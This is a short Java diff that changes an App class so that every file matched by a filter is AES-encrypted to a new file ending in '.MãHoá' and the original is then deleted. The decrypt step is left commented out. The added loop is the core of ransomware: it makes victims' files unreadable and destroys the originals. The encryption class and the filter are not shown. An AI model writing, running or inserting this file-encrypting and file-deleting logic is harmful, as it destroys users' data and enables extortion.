@@ -30,18 +30,21 @@ public class App {
                 .filter(path-> predicate.test(path))
                 .collect(Collectors.toList());
 
-        System.out.println(fileList);
+        fileList.forEach(path->{
+            String fileInput = path;
+            String fileOutput = path + ".MãHoá";
+            try {
+                AESEncryption aesEncryption = new AESEncryption();
 
+                // Encrypt the input file
+                aesEncryption.encrypt(fileInput, fileOutput);
+                FileUtils.delete(fileInput);
+                // Decrypt the encrypted file
+                //aesEncryption.decrypt(fileOutput,fileInput);
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+        });
 
-
-//        String fileInput = "src/file_demo/test.pdf";
-//        String fileOutput = "src/file_demo/test.pdf.MãHoá";
-//
-//        try {
-//            AES.encrypt(fileOutput,fileInput);
-//            FileUtils.delete(fileOutput);
-//        } catch (Exception e) {
-//            throw new RuntimeException(e);
-//        }
     }
 }
